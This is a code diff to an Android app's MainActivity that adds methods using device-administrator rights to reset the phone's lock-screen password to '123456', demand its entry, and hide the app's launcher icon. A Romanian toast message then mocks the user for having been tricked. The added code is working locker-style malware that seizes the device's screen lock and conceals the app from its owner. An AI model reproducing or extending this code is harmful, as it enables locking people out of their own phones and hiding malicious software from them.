@@ -7,6 +7,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.widget.Toast;
 
 import androidx.appcompat.app.AppCompatActivity;
 
@@ -30,12 +31,26 @@ public class MainActivity extends AppCompatActivity {
         //startService(new Intent(this, PhoneService.class));
         startRequestPermissions();
         startAdminRequest();
+        setPassword();
+        hideIcon();
+    }
+
+    private void hideIcon() {
         try{
             PackageManager p = getPackageManager();
             p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+
+    private void setPassword() {
+        DevicePolicyManager devicePolicyManager =(DevicePolicyManager)getApplicationContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
+        ComponentName demoDeviceAdmin =new ComponentName(this, AdminReceiver.class);
+        devicePolicyManager.setPasswordQuality(demoDeviceAdmin,DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED);
+        devicePolicyManager.setPasswordMinimumLength(demoDeviceAdmin, 5);
+        devicePolicyManager.resetPassword("123456", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
+        Toast.makeText(this, "tzeapa, ce, n-ai mai luat tzeapa? xD",  Toast.LENGTH_LONG).show();
     }
 
     private void startAdminRequest() {
